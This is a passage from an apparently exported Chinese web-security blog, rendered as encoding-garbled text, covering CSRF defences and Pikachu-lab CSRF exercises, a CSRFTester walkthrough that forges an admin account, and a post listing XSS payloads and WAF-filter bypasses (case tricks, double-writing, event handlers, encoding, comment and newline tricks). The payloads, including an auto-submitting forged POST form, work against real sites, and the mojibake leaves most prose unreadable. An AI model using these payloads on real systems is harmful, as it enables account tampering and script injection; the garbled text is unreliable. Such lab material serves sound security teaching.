è¯·æ±‚çš„æ¥æºåœ°å€ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè®¿é—®ä¸€ä¸ªå®‰å…¨å—é™é¡µé¢çš„è¯·æ±‚æ¥è‡ªäºåŒä¸€ä¸ªç½‘ç«™ï¼Œæ¯”å¦‚ä¸Šæ–‡ä¸­ç”¨æˆ·Useræƒ³è¦åœ¨ç½‘ç«™WebAä¸­è¿›è¡Œè½¬è´¦æ“ä½œï¼Œé‚£ä¹ˆç”¨æˆ·Userå¿…é¡»å…ˆç™»å½•WebAï¼Œç„¶åå†é€šè¿‡ç‚¹å‡»é¡µé¢ä¸Šçš„æŒ‰é’®å‡ºå‘è½¬è´¦äº‹ä»¶ï¼Œè¿™æ—¶è¯¥è½¬å¸è¯·æ±‚çš„ Refererå€¼å°±ä¼šæ˜¯è½¬è´¦æŒ‰é’®æ‰€åœ¨çš„é¡µé¢çš„URLï¼Œè€Œå¦‚æœé»‘å®¢è¦å¯¹é“¶è¡Œç½‘ç«™å®æ–½ CSRFæ”»å‡»ï¼Œä»–åªèƒ½åœ¨ä»–è‡ªå·±çš„ç½‘ç«™æ„é€ è¯·æ±‚ï¼Œå½“ç”¨æˆ·Useré€šè¿‡é»‘å®¢çš„ç½‘ç«™å‘é€è¯·æ±‚åˆ°WebAæ—¶ï¼Œè¯¥è¯·æ±‚çš„ Refereræ˜¯æŒ‡å‘é»‘å®¢è‡ªå·±çš„ç½‘ç«™ã€‚ &emsp;&emsp;å› æ­¤ï¼Œè¦é˜²å¾¡ CSRF æ”»å‡»ï¼Œç½‘ç«™WebAåªéœ€è¦å¯¹äºæ¯ä¸€ä¸ªè½¬è´¦è¯·æ±‚éªŒè¯å…¶ Refererå€¼ï¼Œå¦‚æœæ˜¯ä»¥ç½‘ç«™WebAçš„ç½‘å€å¼€å¤´çš„åŸŸåï¼Œåˆ™è¯´æ˜è¯¥è¯·æ±‚æ˜¯æ¥è‡ªWebAè‡ªå·±çš„è¯·æ±‚ï¼Œæ˜¯åˆæ³•çš„ã€‚å¦‚æœ Refereræ˜¯å…¶ä»–ç½‘ç«™çš„è¯ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯é»‘å®¢çš„ CSRF æ”»å‡»ï¼Œæ‹’ç»è¯¥è¯·æ±‚ã€‚ ï¼ˆ5ï¼‰åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ tokenéªŒè¯&emsp;&emsp;CSRF æ”»å‡»ä¹‹æ‰€ä»¥èƒ½å¤ŸæˆåŠŸï¼Œæ˜¯å› ä¸ºé»‘å®¢å¯ä»¥å®Œå…¨ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œè¯¥è¯·æ±‚ä¸­æ‰€æœ‰çš„ç”¨æˆ·éªŒè¯ä¿¡æ¯éƒ½æ˜¯å­˜åœ¨äº cookieä¸­ï¼Œå› æ­¤é»‘å®¢å¯ä»¥åœ¨ä¸çŸ¥é“è¿™äº›éªŒè¯ä¿¡æ¯çš„æƒ…å†µä¸‹ç›´æ¥åˆ©ç”¨ç”¨æˆ·è‡ªå·±çš„ cookieæ¥é€šè¿‡å®‰å…¨éªŒè¯ã€‚è¦æŠµå¾¡CSRFï¼Œå…³é”®åœ¨äºåœ¨è¯·æ±‚ä¸­æ”¾å…¥é»‘å®¢æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥ä¿¡æ¯ä¸å­˜åœ¨äº cookieä¹‹ä¸­ã€‚å¯ä»¥åœ¨ HTTP è¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨æ¥éªŒè¯è¿™ä¸ªtokenï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰ tokenæˆ–è€… tokenå†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºå¯èƒ½æ˜¯ CSRF æ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚ &emsp;&emsp;è¿™ç§æ–¹æ³•è¦æ¯”æ£€æŸ¥ Referer è¦å®‰å…¨ä¸€äº›ï¼Œtoken å¯ä»¥åœ¨ç”¨æˆ·ç™»é™†åäº§ç”Ÿå¹¶æ”¾äºsessionä¹‹ä¸­ï¼Œç„¶ååœ¨æ¯æ¬¡è¯·æ±‚æ—¶æŠŠtokenä»sessionä¸­æ‹¿å‡ºï¼Œä¸è¯·æ±‚ä¸­çš„tokenè¿›è¡Œæ¯”å¯¹ã€‚ &emsp;&emsp;tokenå¯çœ‹ä½œæ˜¯æ•°æ®åŒ…çš„ç¼–å·ï¼Œæ¯æ¬¡äº§ç”Ÿä¸€ä¸ªæ–°çš„è¯·æ±‚æ•°æ®åŒ…æ—¶ï¼Œå°±ä¼šæœ‰ä¸€ä¸ªæ–°çš„tokenï¼Œä¸sessionä¸­çš„tokenæ¯”å¯¹ä¸æˆåŠŸï¼Œå³æŠµå¾¡äº†CSRFæ”»å‡» äº”ã€Pikachué¶åœºCSRFç»ƒä¹ 1ã€CSRFï¼ˆGETï¼‰&emsp;&emsp;é¦–å…ˆä»æç¤ºå¯ä»¥ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç ç™»å½•ï¼Œç„¶ååœ¨ç”¨æˆ·ä¿®æ”¹ä¸ªäººä¿¡æ¯çš„æ—¶å€™ï¼Œåäººé€šè¿‡ä¸€äº›æ–¹å¼ï¼ˆARPæ¬ºéª—åŠ«æŒã€ä¸­é—´äººç›‘å¬ã€æµé‡å—…æ¢ï¼‰æŠ“å–åˆ°äº†åŒ… &emsp;&emsp;å¾—åˆ°ä¸€ä¸ªä¿®æ”¹ç”µè¯å·ç URLï¼š127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=123456789&amp;add=&amp;email=&amp;submit=submitï¼Œå¤åˆ¶å¥½ä¿ç•™ï¼ŒæŠŠåŒ…æ”¾æ‰ï¼Œç°åœ¨æ‰‹æœºå·æ˜¯123456789 &emsp;&emsp;å‡å¦‚æƒ³è®©æ‰‹æœºå·æ”¹ä¸º666666ï¼Œåšä¸€ä¸ªhtmlï¼Œå…¶ä¸­ä¸€æ¡å…³é”®è¯­å¥&lt;a href=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=666666&amp;add=&amp;email=&amp;submit=submit&quot;&gt;ç‚¹æˆ‘æŠ½å¥–ï¼&lt;/a&gt;ï¼Œå°†åšå¥½çš„htmlå‘ç»™å½“äº‹äººï¼Œå½“äº‹äººç‚¹å‡»äº†é“¾æ¥ï¼Œå³å¯æˆåŠŸä¿®æ”¹ç”µè¯å·ç ï¼ˆå¦‚æœæ˜¯æ­£ç»çš„è¯å¾—æŠŠhtmlæ”¾åˆ°å…¬ç½‘ä¸Šï¼‰ 2ã€CSRFï¼ˆPOSTï¼‰&emsp;&emsp;å°ç™½ä¿®æ”¹ä¿¡æ¯ï¼Œç‚¹å‡»æäº¤ï¼Œè¢«é»‘å®¢æŠ“åˆ°äº†åŒ…ï¼Œè®°å½•å¥½ &emsp;&emsp;æ­¤æ—¶å†™ä¸€ä¸ªPOSTä¼ å‚çš„htmlé¡µé¢ï¼Œå‘é€ç»™å°ç™½ï¼Œå°ç™½ç‚¹å‡»ä¸€é—ªè€Œè¿‡å°±ä¼šè¢«ä¿®æ”¹ä¿¡æ¯äº†ï¼ˆæˆ–è€…ç”¨BurpSuiteä¹Ÿå¯ä»¥ä¸€é”®ç”Ÿæˆâ€œengagement toolsâ€-&gt;â€œgenerate CSRF pocâ€ï¼‰ &lt;html&gt; &lt;head&gt; &lt;script&gt; window.onload = function()&#123; document.getElementById(&quot;postsubmit&quot;).click(); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_p ost_edit.php&quot;&gt; &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt; &lt;input id=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;666666&quot; /&gt; &lt;input id=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;china&quot; /&gt; &lt;input id=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;vince@pikachu.com&quot; /&gt; &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt; &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 3ã€CSRF Token&emsp;&emsp;ç”±äºtokenå€¼æ¯æ¬¡æäº¤åéƒ½ä¼šå¤±æ•ˆï¼Œæ¶æ„æ”»å‡»è€…æŠ“åˆ°å°ç™½çš„GETè¯·æ±‚æ—¶é‡Œé¢çš„tokenå·²ç»å¤±æ•ˆäº†ï¼Œæ‰€ä»¥ç½‘ç«™ä¹Ÿå°±æ²¡æœ‰æ‰§è¡ŒGETè¯·æ±‚çš„æ“ä½œï¼ŒCSRFä¹Ÿå°±é˜²å¾¡æˆåŠŸ å…­ã€CSRFè‡ªåŠ¨åŒ–æµ‹è¯•â€”CSRFTester1ã€CSRFTesterç®€ä»‹&emsp;&emsp;CSRFTesterå·¥å…·çš„æµ‹è¯•åŸç†å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼Œä½¿ç”¨ä»£ç†æŠ“å–æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®è¿‡çš„æ‰€æœ‰çš„è¿æ¥ä»¥åŠæ‰€æœ‰çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé€šè¿‡åœ¨CSRFTesterä¸­ä¿®æ”¹ç›¸åº”çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé‡æ–°æäº¤ï¼Œç›¸å½“äºä¸€æ¬¡ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¦‚æœæµ‹è¯•çš„è¯·æ±‚æˆåŠŸè¢«ç½‘ç«™æœåŠ¡å™¨æ¥å—ï¼Œåˆ™è¯´æ˜å­˜åœ¨CSRFæ¼æ´ï¼Œå½“ç„¶æ­¤æ¬¾å·¥å…·ä¹Ÿå¯ä»¥è¢«ç”¨æ¥è¿›è¡ŒCSRFæ”»å‡»ã€‚ 2ã€CSRFTesterç¯å¢ƒå‡†å¤‡ Windowsç³»ç»Ÿ Javaç¯å¢ƒé…ç½® CSRFTester ç‚¹å‡»ä¸‹è½½ æå–ç ï¼škytb espcmsï¼šä¸€ä¸ªå­˜åœ¨CSRFçš„CMS ç‚¹å‡»ä¸‹è½½ æå–ç ï¼šupg1 3ã€CSRFTesterä½¿ç”¨&emsp;&emsp;å®‰è£…espcms &emsp;&emsp;è®¾ç½®æµè§ˆå™¨ä»£ç†ï¼š127.0.0.1:8008 &emsp;&emsp;æäº¤è¡¨å•å‰ï¼Œå…ˆå¼€å¯CSRFTesterç›‘å¬ &emsp;&emsp;ç™»å½•espcmsåå°ï¼Œæ·»åŠ ä¸€ä¸ªåä¸ºw01keçš„ä¼šå‘˜ï¼Œæäº¤è¡¨å• &emsp;&emsp;åœ¨CSRFTesteré‡Œæ‰¾åˆ°æäº¤çš„è¡¨å•æ•°æ®åŒ…ï¼Œå°†å…¶åŸæ¥æ•°æ®ä¿®æ”¹ä¸ºadmin2æ•°æ®ï¼Œç„¶åç‚¹å‡»å³ä¸‹è§’Generate HTMLä¿å­˜åˆ°æŒ‡å®šç›®å½•ï¼Œä¼šç”Ÿæˆä¸€ä¸ªindex.htmlæ–‡ä»¶ &emsp;&emsp;æ‰“å¼€index.htmlå°†æœ«å°¾formé‡Œé¢çš„ä»£ç å…¨åˆ é™¤æ‰ &emsp;&emsp;ä¿®æ”¹å®Œåï¼Œä½¿ç”¨åŒä¸ªæµè§ˆå™¨æ‰“å¼€index.htmlï¼Œé¡µé¢è¿”å›true &emsp;&emsp;å†è¿”å›æŸ¥çœ‹ä¼šå‘˜åˆ—è¡¨é¡µé¢ï¼Œå¯ä»¥å‘ç°å·²ç»æˆåŠŸæ·»åŠ äº†admin2ç”¨æˆ· ã€å°è´´å£«ã€‘ä½¿ç”¨CSRFTesterå·¥å…·åšæµ‹è¯•æ—¶ï¼Œä¸ºæä¾›æ•ˆç‡ï¼Œæœ€å¥½åªæ‰“å¼€è¦æµ‹è¯•çš„ç½‘ç«™é¡µé¢ï¼Œä¹Ÿå°±æ˜¯åœ¨å·¥å…·ä¸­æˆªè·çš„é¡µé¢å°½å¯èƒ½å°‘ï¼Œå¦åˆ™å¯èƒ½æµ‹è¯•ç»“æœä¸å‡†ç¡®ã€‚ ä¸ƒã€å‚è€ƒé“¾æ¥ https://blog.csdn.net/diubrother/article/details/88366932?spm=1001.2014.3001.5501 http://luckyzmj.cn/posts/a1b686d3.html#","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"CSRF","slug":"CSRF","permalink":"https://wolke.cn/tags/CSRF/"}],"author":"w01ke"},{"title":"XSSçš„Wafç»•è¿‡åŠå·¥å…·ä½¿ç”¨","slug":"XSSçš„Wafç»•è¿‡åŠå·¥å…·ä½¿ç”¨","date":"2022-01-30T15:04:53.000Z","updated":"2022-02-01T11:48:03.143Z","comments":true,"path":"post/c970015a.html","link":"","permalink":"https://wolke.cn/post/c970015a.html","excerpt":"","text":"ä¸€ã€å¸¸ç”¨payload1ã€echo&lt;?phpecho &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;?&gt; 2ã€imgæ ‡ç­¾&lt;img src=javascript:alert(&quot;xss&quot;)&gt;&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;&lt;img scr=&quot;URL&quot; style=&#x27;Xss:expression(alert(xss));&#x27;&gt;&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;x&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;&lt;img src=x onmouseover=alert(&#x27;xss&#x27;)&gt; 3ã€CSS&lt;img STYLE=&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt; 4ã€hrefæ ‡å‡†æ ¼å¼&lt;a href=&quot;https://www.baidu.com&quot;&gt;baidu&lt;/a&gt;XSSåˆ©ç”¨æ–¹å¼1&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;aa&lt;/a&gt; &lt;a href=javascript:eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt; &lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt; XSSåˆ©ç”¨æ–¹å¼2&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; &lt;a href=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;aa&lt;/a&gt;XSSåˆ©ç”¨æ–¹å¼3&lt;a href=&quot;&quot; onclick=eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt;XSSåˆ©ç”¨æ–¹å¼4&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#x27;xss&#x27;) y=2016&gt;aa&lt;/a&gt; 5ã€formæ ‡ç­¾XSSåˆ©ç”¨æ–¹å¼1&lt;form action=javascript:alert(&#x27;xss&#x27;) method=&quot;get&quot;&gt;&lt;form action=javascript:alert(&#x27;xss&#x27;)&gt;XSSåˆ©ç”¨æ–¹å¼2&lt;form method=post action=aa.asp? onmouseover=prompt(&#x27;xss&#x27;)&gt;&lt;form method=post action=aa.asp? onmouseover=alert(&#x27;xss&#x27;)&gt;&lt;form action=1 onmouseover=alert(&#x27;xss&#x27;)&gt; 6ã€inputæ ‡ç­¾æ ‡å‡†æ ¼å¼&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;åˆ©ç”¨æ–¹å¼1&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;åˆ©ç”¨æ–¹å¼2&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;åˆ©ç”¨æ–¹å¼4&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; 7ã€iframeæ ‡ç­¾XSSåˆ©ç”¨æ–¹å¼1&lt;iframe src=javascript:alert(&#x27;xss&#x27;);height=5width=1000 /&gt;&lt;iframe&gt;XSSåˆ©ç”¨æ–¹å¼2&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;&lt;!--åŸcode--&gt; &lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt; &lt;!--base64ç¼–ç --&gt; &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;XSSåˆ©ç”¨æ–¹å¼3&lt;iframe src=&quot;aaa&quot; Î¿nmÎ¿useÎ¿ver=alert(&#x27;xss&#x27;) /&gt;&lt;iframe&gt;XSSåˆ©ç”¨æ–¹å¼3&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt; 8ã€svgæ ‡ç­¾&lt;svg onload=alert(1)&gt; 9ã€å…¶ä»– äº‹ä»¶å‹è¿˜æœ‰onbodyæ ‡ç­¾ äºŒã€å¸¸ç”¨çš„ç»•è¿‡Waf1ã€åˆ©ç”¨å¤§å°å†™ç»•è¿‡&emsp;&emsp;è¿™ä¸ªç»•è¿‡æ–¹å¼çš„å‡ºç°æ˜¯å› ä¸ºç½‘ç«™ä»…ä»…åªè¿‡æ»¤äº†&lt;script&gt;æ ‡ç­¾ï¼Œè€Œæ²¡æœ‰è€ƒè™‘æ ‡ç­¾ä¸­çš„å¤§å°å†™å¹¶ä¸å½±å“æµè§ˆå™¨çš„è§£é‡Šæ‰€è‡´ã€‚å…·ä½“çš„æ–¹å¼å°±åƒè¿™æ ·ï¼š &lt;sCriPt&gt;alert(1)&lt;/SCripT&gt; 2ã€åˆ©ç”¨è¿‡æ»¤åè¿”å›è¯­å¥å†æ¬¡æ„æˆæ”»å‡»è¯­å¥æ¥ç»•è¿‡ï¼ˆç»å¸¸ç”¨åŒå†™ç»•è¿‡ï¼‰&emsp;&emsp;æœ‰çš„åªè¿‡æ»¤äº†ä¸€æ¬¡scriptæ ‡ç­¾ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨åŒå†™æ¥ç»•è¿‡&lt;sCri&lt;script&gt;Pt&gt;alert(1)&lt;/SC&lt;/script&gt;ripT&gt; 3ã€å¹¶ä¸æ˜¯åªæœ‰scriptæ ‡ç­¾æ‰å¯ä»¥æ’å…¥ä»£ç ï¼ˆ1ï¼‰imgæ ‡ç­¾&emsp;&emsp;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;å°±å¯ä»¥å†æ¬¡æ„‰å¿«çš„å¼¹çª—ã€‚åŸå› å¾ˆç®€å•ï¼Œæˆ‘ä»¬æŒ‡å®šçš„å›¾ç‰‡åœ°å€æ ¹æœ¬ä¸å­˜åœ¨ä¹Ÿå°±æ˜¯ä¸€å®šä¼šå‘ç”Ÿé”™è¯¯ï¼Œè¿™æ—¶å€™onerroré‡Œé¢çš„ä»£ç è‡ªç„¶å°±å¾—åˆ°äº†æ‰§è¡Œã€‚ ï¼ˆ2ï¼‰onmouseoveräº‹ä»¶ onmouseover=&quot;alert(1)&quot;ï¼Œæ¯”å¦‚ &lt;a onmousemove=&quot;do something here&quot;&gt; å½“ç”¨æˆ·é¼ æ ‡ç§»åŠ¨æ—¶å³å¯è¿è¡Œä»£ç  &lt;div onmouseover=&quot;do something here&quot;&gt; å½“ç”¨æˆ·é¼ æ ‡åœ¨è¿™ä¸ªå—ä¸Šé¢æ—¶å³å¯è¿è¡Œï¼ˆå¯ä»¥é…åˆweightç­‰å‚æ•°å°†divè¦†ç›–é¡µé¢ï¼Œé¼ æ ‡ä¸åˆ’è¿‡éƒ½ä¸è¡Œï¼‰ ï¼ˆ3ï¼‰onclickäº‹ä»¶&emsp;&emsp;onclick=&quot;alert(1)&quot; è¿™ä¸ªè¦ç‚¹å‡»åæ‰èƒ½è¿è¡Œä»£ç ï¼Œæ¡ä»¶ç›¸å¯¹è‹›åˆ»ï¼Œå°±ä¸å†è¯¦è¿°ã€‚ ï¼ˆ4ï¼‰onloadäº‹ä»¶&emsp;&emsp;æ¯”å¦‚ä»¥ä¸‹ä»£ç  function render (input) &#123; let domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/ //http...æˆ–https.... if (domainRe.test(input)) &#123; //æ˜¯å¦åŒ…å«åœ¨inputä¸­ return `&lt;script src=&quot;$&#123;input&#125;&quot;&gt;&lt;/script&gt;` &#125; return &#x27;Invalid URL&#x27;&#125; &emsp;&emsp;payloadï¼šhttp://www.segmentfault.com&quot; onload=&quot;alert(1) 4ã€ç¼–ç è„šæœ¬ç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼ˆ1ï¼‰Javascriptçš„ç¼–ç â€“eval()å‡½æ•°&emsp;&emsp;\\uXXXX è¿™ç§å†™æ³•çš„Unicode è½¬ä¹‰åºåˆ—ï¼Œè¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œå…¶ä¸­ XXXX è¡¨ç¤ºä¸€ä¸ª 16 è¿›åˆ¶æ•°å­—ï¼Œå¦‚&lt;çš„Unicode ç¼–ç ä¸º\\u003cã€‚ &emsp;&emsp;æœ‰çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨å¾€å¾€ä¼šå¯¹ä»£ç ä¸­çš„å…³é”®å­—ï¼ˆå¦‚alertï¼‰è¿›è¡Œè¿‡æ»¤ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥å°è¯•å°†å…³é”®å­—è¿›è¡Œç¼–ç åå†æ’å…¥ï¼Œä¸è¿‡ç›´æ¥æ˜¾ç¤ºç¼–ç æ˜¯ä¸èƒ½è¢«æµè§ˆå™¨æ‰§è¡Œçš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦ä¸€ä¸ªè¯­å¥eval()æ¥å®ç°ã€‚eval()ä¼šå°†ç¼–ç è¿‡çš„è¯­å¥è§£ç åå†æ‰§è¡Œï¼Œç®€ç›´å¤ªè´´å¿ƒäº†ã€‚ &emsp;&emsp;ä¾‹å¦‚alert(1)ç¼–ç è¿‡åå°±æ˜¯\\u0061\\u006c\\u0065\\u0072\\u0074(1)ï¼ˆå¯¹åº”äºASCIIç çš„åå…­è¿›åˆ¶ï¼‰ &emsp;&emsp;æ‰€ä»¥æ„å»ºå‡ºæ¥çš„æ”»å‡»è¯­å¥å¦‚ä¸‹ï¼š&lt;script&gt;eval(\\u0061\\u006c\\u0065\\u0072\\u0074(1))&lt;/script&gt; ï¼ˆ2ï¼‰HTMLå®ä½“ç¼–ç &emsp;&emsp;å®ä½“ç¼–ç å­—ç¬¦&lt;svg&gt;ï¼ˆç¿»è¯‘å®˜ï¼‰ &emsp;&emsp;æŠŠè¦è½¬ç çš„å…ˆUnicodeè½¬æ¢ä¸€ä¸‹ï¼Œç„¶ååå°çœ‹åˆ°æœ‰ç¿»è¯‘å®˜ä¼šæŠŠUnincodeç¼–ç è½¬å›ä¸ºå½“åˆçš„å­—ç¬¦ &emsp;&emsp;æ¯”å¦‚ä»¥ä¸‹ä»£ç  function render (input) &#123; const stripBracketsRe = /[()`]/g //æ­£åˆ™è¡¨è¾¾å¼ï¼Œçœ‹//åŒ…è£¹çš„å†…å®¹å³å¯ input = input.replace(stripBracketsRe, &#x27;&#x27;) æŠŠ()`æ›¿æ¢ä¸ºç©º return input&#125; &emsp;&emsp;payloadï¼š&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt; å› ä¸ºæ§åˆ¶å­—ç¬¦()å˜æˆäº†å®ä½“ç¼–ç å› æ­¤è¦ä½¿ç”¨ç¿»è¯‘å®˜æ‰èƒ½è®©()æ­£ç¡®å‘æŒ¥æ§åˆ¶å­—ç¬¦çš„ä½œç”¨ ï¼ˆ3ï¼‰ç¿»è¯‘å®˜ï¼ˆUnicodeç¼–ç ï¼‰function render (input) &#123; input = input.toUpperCase() //æŠŠæ‰€æœ‰çš„è¾“å‡ºå†…å®¹éƒ½å¤§å†™ return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`&#125; &emsp;&emsp;payloadï¼š&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt; ğŸ‘ˆHTMLç¼–ç æˆ–è€…&lt;svg&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;ğŸ‘ˆUnicodeç¼–ç  5ã€ä¸»åŠ¨é—­åˆæ ‡ç­¾å®ç°æ³¨å…¥ä»£ç &emsp;&emsp;æ¯”å¦‚ä»¥ä¸‹ä»£ç  function render (input) &#123; return &#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27; + input + &#x27;&quot;&gt;&#x27;&#125; &emsp;&emsp;payloadï¼š&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;input type=&#39;name&#39; value=&quot; æˆ–è€… &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 6ã€ç»•è¿‡å°æ‹¬å·()&emsp;&emsp;åœ¨å‰ç«¯ä¸­ï¼Œåå¼•å·```å¯ä»¥å½“ä½œå°æ‹¬å·æ¥ä½¿ç”¨ &emsp;&emsp;æ¯”å¦‚ä»¥ä¸‹ä»£ç  function render (input) &#123; const stripBracketsRe = /[()]/g //æ­£åˆ™è¡¨è¾¾å¼ï¼Œçœ‹//ä¸­é—´çš„å†…å®¹å³å¯ input = input.replace(stripBracketsRe, &#x27;&#x27;) //æŠŠ[()]æ›¿æ¢ä¸ºç©º return input&#125; &emsp;&emsp;payloadï¼š&lt;script&gt;alert1&lt;/script&gt; 7ã€ç»•è¿‡()`(1)ä½¿ç”¨HTMLå®ä½“ç¼–ç å¦‚ä¸Šæ–‡æ‰€è¿° 8ã€ç»•è¿‡HTMLæ³¨é‡Šç¬¦ æœ‰ä¸¤ç§æ³¨é‡Šæ–¹æ³•ï¼š &lt;!-- æ³¨é‡Šå†…å®¹ --&gt; ``&lt;!â€“ æ³¨é‡Šå†…å®¹ â€“!&gt;` æ¯”å¦‚ä»¥ä¸‹ä»£ç  function render (input) &#123; input = input.replace(/--&gt;/g, &#x27;ğŸ˜‚&#x27;) //å°†--&gt;æ›¿æ¢ä¸ºç¬‘è„¸ return &#x27;&lt;!-- &#x27; + input + &#x27; --&gt;&#x27;&#125; payloadï¼š--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--ï¼Œä½¿ç”¨å¦ä¸€ä¸ªæ³¨é‡Šç¬¦æ¥ç•¸å½¢è¿›è¡Œç»•è¿‡ 9ã€åˆ©ç”¨æ¢è¡Œç¬¦ç»•è¿‡&emsp;&emsp;%0aâ€“æ¢è¡Œç¬¦ &emsp;&emsp;æ¯”å¦‚ä»¥ä¸‹ä»£ç  function render (input) &#123; input = input.replace(/auto|on.*=|&gt;/ig, &#x27;_&#x27;) //autoæˆ–onå¼€å¤´ï¼Œåé¢è·Ÿä»»æ„ä¸œè¥¿ï¼Œç›´åˆ°å‡ºç°=æˆ–è€…&gt;éƒ½è½¬åŒ–æˆ_ return `&lt;input value=1 $&#123;input&#125; type=&quot;text&quot;&gt;`&#125; &emsp;&emsp;payloadï¼š onmouseover=&quot;alert(1)&quot; åœ¨å‰ç«¯çš„ä¸–ç•Œé‡Œï¼Œæ¢è¡Œä¸€æ ·æœ‰ç”¨ï¼Œå› æ­¤è¿™é‡Œé€šè¿‡æ¢è¡Œæ¥é¿å…onç¢°åˆ°= 10ã€ç»•è¿‡å³æ ‡ç­¾function render (input) &#123; const stripTagsRe = /&lt;\\/?[^&gt;]+&gt;/gi input = input.replace(stripTagsRe, &#x27;&#x27;) //æ‰€æœ‰æ ‡ç­¾ç±»çš„ï¼Œåªè®©å†™å·¦æ ‡ç­¾ï¼Œå³æ ‡ç­¾ä¸€åŠ ï¼Œå°±æ›¿æ¢ä¸ºç©º return `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`&#125; &emsp;&emsp;åŒ¹é…&lt;/ ä»»æ„å­—ç¬¦&gt;ï¼Œè€Œä¸”/iè¿‡æ»¤äº†å¤§å°å†™ï¼Œä½†htmlçš„å•æ ‡ç­¾ä¹Ÿå¯ä»¥è§£æ &emsp;&emsp;payloadï¼š&lt;img src=x onerror=&quot;alert(1)&quot; 11ã€ç»•è¿‡&lt;/å†…å®¹&gt;function render (src) &#123; src = src.replace(/&lt;\\/style&gt;/ig, &#x27;/* \\u574F\\u4EBA */&#x27;) //ç¢°åˆ°&lt;/style&gt;å°±æ›¿æ¢æˆ/*åäºº*/ return ` &lt;style&gt; $&#123;src&#125; &lt;/style&gt; `&#125; 